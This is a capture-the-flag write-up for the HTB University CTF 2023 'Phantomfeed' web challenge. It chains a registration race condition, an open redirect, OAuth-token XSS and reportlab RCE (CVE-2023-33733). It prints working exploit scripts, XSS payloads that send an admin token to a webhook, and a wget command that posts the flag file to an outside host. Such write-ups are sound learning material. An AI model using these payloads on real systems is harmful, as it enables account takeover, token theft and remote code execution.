---
title: Phantomfeed - HTB University CTF 2023
date: 2023-12-16 12:01:48
author: Winters
author_url: https://twitter.com/ArunKr1shnan
categories:
  - Web
tags:
  - HTBUniversityCTF
  - Race Condition
  - Oauth
  - RCE
  - Web
---

**tl;dr**

+ Leak JWT token through Race Condition.
+ Leak authorization token via an open redirect.
+ Chaining XSS & CSRF in the oauth pipeline to leak the Admin's oauth access token.
+ RCE via CVE-2023-33733.

<!--more-->

**Challenge Points**: 400+
**No. of solves**: < 15
**Solved by**: [Winters](https://twitter.com/ArunKr1shnan)

## Challenge Description

Some black-hat affiliated students talk of an underground hacking forum they frequent, the university hacking club has decided it is worth the effort of trying to hack into this illicit platform, in order to gain access to a sizeable array of digital weaponry that could prove critical to securing the campus before the undead arrive.

## Intro

This was an interesting challenge from HTB University CTF this year. In order to solve this we had to chain multiple vulnerablilities together ranging from an Open redirect to RCE. This challenge also had the least number of solves among the Web Category. We were not able to solve it during the ctf but solved it later on.

## Analysis

This challenge had two main parts, the phantom-feed service and phantom-market service. These two parts are connected through an oauth pipeline.

### Race Condition

Now first we need an account to proceed, inspecting the code of the register endpoint we can see that our username, password and email are getting stored in the database, after which a verification code is sent to our email, which we need to proceed, but the catch here is the verification code is never sent so we can't actually login, but there is a flaw.  

```py
# routes.py
@web.route("/register", methods=["GET", "POST"])
def register():
  if request.method == "GET":
    return render_template("register.html", title="register")

  if request.method == "POST":
    username = request.form.get("username")
    password = request.form.get("password")
    email = request.form.get("email")

  if not username or not password or not email:
    return render_template("error.html", title="error", error="missing parameters"), 400

  db_session = Database()
  user_valid, user_id = db_session.create_user(username, password, email)
  
  if not user_valid:
    return render_template("error.html", title="error", error="user exists"), 401

  email_client = EmailClient(email)
  verification_code = db_session.add_verification(user_id)
  email_client.send_email(f"http://phantomfeed.htb/phantomfeed/confirm?verification_code={verification_code}")

  return render_template("error.html", title="error", error="verification code sent"), 200
```

Intially when the users table is created in database.py verified is by default set to true.

```py
# database.py
class Users(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    verification_code = Column(String)
    # Verified is true here
    verified = Column(Boolean, default=True)
    username = Column(String)
    password = Column(String)
    email = Column(String)
```

Verified is then set to false when the verification code is generated for the particular user.

```py
#database.py
def add_verification(self, user_id):
    verification_code = generate(12)
    self.session.query(Users).filter(Users.id == user_id).update({"verification_code": verification_code, "verified": False})
    self.session.commit()
    return verification_code
```

Also we can see that the flask app is running in threaded mode, so there is a possiblity of a potential race condition here, which we can exploit by registering a new user who will have ``verified`` set to true. Concurrently, we'll send a post request to the /login endpoint which will log us in before ``verfied`` is set to false again in the email verification part of the app. Hence we'll get the JWT token for the logged in user.

### Exploit

Here is the exploit that we used to get the JWT token via Race condition.

```py
# Get JWT token
import requests
import threading
import random
import string

URL = "http://127.0.0.1:1337/phantomfeed"
PROXY = {
    "http": "http://127.0.0.1:8080"
}

JWT = False

def register(username,password,email):
    data = {
        "username":username,
        "password":password,
        "email":email
    }

    r = requests.post(URL + '/register',data=data,proxies=PROXY,allow_redirects=False)


def login(username,password):
    global JWT
    data = {
        "username":username,
        "password":password
    }

    r = requests.post(URL + '/login',data=data,proxies=PROXY,allow_redirects=False)

    if(r.status_code != 401):
        print(r.headers)
        token = r.headers.get("Set-Cookie")
        print(token)
        print("USERNAME: "+username)
        JWT = True


def main():
    threads = []
    while not JWT:
        username = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        password = username
        email = username + "@ok.com"
        register_thread = threading.Thread(target=register,args=(username,password,email))
        threads.append(register_thread)
        register_thread.start()

        for i in range(50):
            login_thread = threading.Thread(target=login,args=(username,password))
            threads.append(login_thread)
            login_thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
```

### Oauth

After logging in with the token, we can see that there is a feature to put up a feed in the forum and is handled by the ``/feed`` endpoint. The market_link that we give in this feed is given to the bot which is running as an admin user.

In the bot's code we can see that our given link gets added to the bot like this ``client.get("http://127.0.0.1:5000" + link)`` without any sanitization being performed on our given link. So if we give ``@example.com`` as our market_link in the field the bot would visit ``http://127.0.0.1:5000@example.com``, ie the bot will visit ``example.com`` So we can redirect the bot to where ever we want. Here we need control of the entire URL not just the path as the oauth pipeline is setup on ``http://127.0.0.1:3000``.

```
events {
    worker_connections  1024;
}

http {
    server {
        listen 1337;
        server_name pantomfeed;
        
        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /phantomfeed {
            proxy_pass http://127.0.0.1:3000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location /backend {
            proxy_pass http://127.0.0.1:4000;
        }
    }
}

```

The oauth flow in this application is pretty simple, the ``/oauth2/auth`` endpoint takes in a ``client_id`` and ``redirect_url``  as GET parameters and basically asks the user to allow authorization of ``client_id`` or not via oauth, this is the start of the oauth pipeline in this application. If authorized the request gets forwarded to the ``/oauth2/code`` endpoint which generates the authorization_code taking in the client_id and redirect_url as inputs, like shown in the code below

```py
# routes.py
@web.route("/oauth2/code", methods=["GET"])
@auth_middleware
def oauth2():
  client_id = request.args.get("client_id")
  redirect_url = request.args.get("redirect_url")

  if not client_id or not redirect_url:
    return render_template("error.html", title="error", error="missing parameters"), 400
    
  authorization_code = generate_authorization_code(request.user_data["username"], client_id, redirect_url)
  url = f"{redirect_url}?authorization_code={authorization_code}"
```

So we can leak the authorization_code here as we have complete control over the redirect_url parameter, so if we give our webhook url here we can leak the authorization code.

Once we have the authorization_code a request is sent to the ``/oauth2/token`` endpoint by callback.vue file.

```py
@web.route("/oauth2/token", methods=["GET"])
@auth_middleware
def token():
  authorization_code = request.args.get("authorization_code")
  client_id = request.args.get("client_id")
  redirect_url = request.args.get("redirect_url")

  if not authorization_code or not client_id or not redirect_url:
    return render_template("error.html", title="error", error="missing parameters"), 400

  if not verify_authorization_code(authorization_code, client_id, redirect_url):
    return render_template("error.html", title="error", error="access denied"), 401

  access_token = create_jwt(request.user_data["user_id"], request.user_data["username"])
  
  return json.dumps({ 
    "access_token": access_token,
    "token_type": "JWT",
    "expires_in": current_app.config["JWT_LIFE_SPAN"],
    "redirect_url": redirect_url
  })
```

Here our authorization_token is verified with the one created in the ``/oauth2/code`` endpoint which was stored in the database. If we have given the correct authorization_token then the endpoint will create an access_token which is a JWT token and  returns a JSON object at the very end which will have the generated access_token. But there is a catch here, the Content-Type of the response is ``text/html``, so if we have something like ``<script> alert('xss')</script>`` in redirect_url it will be rendered in the DOM and the script will be executed.

The Oauth pipeline ends after making the request to ``/oauth2/token`` endpoint if everything is verified properly then we are taken to ``phantom_market`` which is the second part of this challenge.

### Exploit

So combining everything that we know, first we can leak the authorization token via the open redirect that we found, so we'll set the following link

```
@127.0.0.1:3000/phantomfeed/oauth2/code?client_id=phantom-market&redirect_url=<your_webhook>?<script>window.location.href=`https://webhook.site/<your_webhook>?token=${btoa(document.body.innerHTML)}`</script>
```
as the market_link in the /feed endpoint which will make the bot start an oauth pipeline, and we'll get the authorization code for the admin user in our webhook.

Now we have the authorization_code,we can send the request to the ``/oauth2/token`` endpoint, remember the client_id and redirect_url that we give in both endpoints ``/oauth2/code`` and ``/oauth2/token`` should be the same as it is verified in the backend with the help of the authorization_code. So we give the following link as the market link in the ``/feed`` endpoint.

```
@127.0.0.1:3000/phantomfeed/oauth2/token?client_id=phantom-market&redirect_url=<your_webhook>?<script>window.location.href=`<your_webhook>?token=${btoa(document.body.innerHTML)}`</script>&authorization_code=<authorization_code>
```

Since our client_id and redirect_url are the same in both the requests, the endpoint will return the page with our XSS payload which will take the entire page and send it to our webhook, now this would also have the access_token for the admin that we need.


### phantom_market 

Now we have the admin's access token we can login as admin.

```py
# routes.py - phantom_market
@web.before_request
def before_request():
  auth_header = request.headers.get("Authorization")
  if not auth_header or "Bearer" not in auth_header:
    return response("Access token does not exist"), 400
  
  access_token = auth_header[7:]
  access_token = verify_access_token(access_token)

  if not access_token:
    return response("Access token is invalid"), 400
  
  request.user_data = access_token


def admin_middleware(func):
  def check_admin(*args, **kwargs):
    if request.user_data["user_type"] != "administrator":
      return response("Restricted to administrators"), 400

    return func(*args, **kwargs)

  check_admin.__name__ = func.__name__
  return check_admin
```

We just need to add in the header ``Authorization: Bearer <admin's_access_token>`` and we'll be logged in as admin.

Now the question comes why did we leak the admin's token in the first place. The answer is that we needed access to the endpoint ``/orders/html`` which takes a ``color`` post parameter and it'll generate a pdf containing all the orders that you have made, as shown in the code below.

```py
@web.route("/orders/html", methods = ["POST"])
@admin_middleware
def orders_html():
  color = request.form.get("color")

  if not color:
    return response("No color"), 400

  db_session = Database()
  orders = db_session.get_all_orders()
  
  if not orders:
    return response("No orders placed"), 200

  orders_template = render_template("orders.html", color=color)
  
  html2pdf = HTML2PDF()
  pdf = html2pdf.convert(orders_template, orders)
  
  pdf.seek(0)
  return send_file(pdf, as_attachment=True, download_name="orders.pdf", mimetype="application/pdf")
```

For this functionality they are using ``reportlab==3.6.12`` which has an RCE vulnerability as mentioned in this [CVE](https://github.com/c53elyas/CVE-2023-33733)

There are a lot of POC's out there to exploit this, one of the payload is this

```
color = [[[getattr(pow, Word('__globals__'))['os'].system('wget <your_webhook> --post-file /flag*') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'
```

So sending a POST request to ``/orders/html`` with color set to the above payload would get us the flag in our webhook.

```py
import requests

url = "http://127.0.0.1:3000/backend/orders/html"

payload = "[[[getattr(pow, Word('__globals__'))['os'].system('wget <your_webhook> --post-file /flag*') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"

headers = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjY1ODQ3OSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl90eXBlIjoiYWRtaW5pc3RyYXRvciJ9.etEj1fXSpMGQIT5LVHGHKmafqE7xFQw5P1uaQQnZUufU0zRANPH0WN7mLlUGjxkehInARAGrJvMxOg4uVPbRY3jR4hwj64xuNtqbou0S21Q9nmnXcAOlxBRELNlbcRse2zIy-JhwV1I-HZOelAXpO7xFPoYlCcGfovvf5P59DZgno29iRk6_dKipEXzRnRk0_RqnloP6ubvj8WYvtnNRqJYjtNXQ1HUTgPB_ump0wlWhxxvv2xnyxsRwT1XEYziV-F2yu_hHkTqvVAiNrpIHzoperSii9Y42Zv9ngs8sXGtCB-zevQ42csCfmi5CVRhs8ooZrgM1FiBl2JA5NHrFww",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded",
}

data = {"color": f"{payload}"}

response = requests.post(url, headers=headers, data=data)

print("Status Code:", response.status_code)
print("Response Content:", response.text)

```

## Flag

```HTB{r4c3_2_rc3_04uth2_j4ck3d!}```